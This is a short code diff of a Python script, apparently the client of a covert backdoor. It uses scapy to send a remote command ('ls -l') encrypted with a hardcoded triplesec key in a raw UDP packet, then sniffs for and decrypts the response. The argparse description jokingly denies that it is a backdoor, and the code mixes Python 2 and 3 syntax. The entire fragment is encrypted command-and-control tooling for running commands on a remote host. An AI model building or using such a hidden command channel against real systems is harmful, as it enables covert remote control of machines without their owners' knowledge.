@@ -3,8 +3,9 @@ import argparse
 import triplesec
 
 def packetFunc(packet):
-  encryptedData = packet.load
+  encryptedData = packet['Raw'].load
   data = triplesec.decrypt(encryptedData, b'key yo').decode()
+  print data
 
 
 parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
@@ -28,6 +29,6 @@ args = parser.parse_args()
 command = "ls -l"
 encryptedCommand = triplesec.encrypt(command, b'key yo')
 sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
-packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=command)
+packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
 send(packet)
 sniff(filter=sniffFilter,prn=packetFunc, count=1)
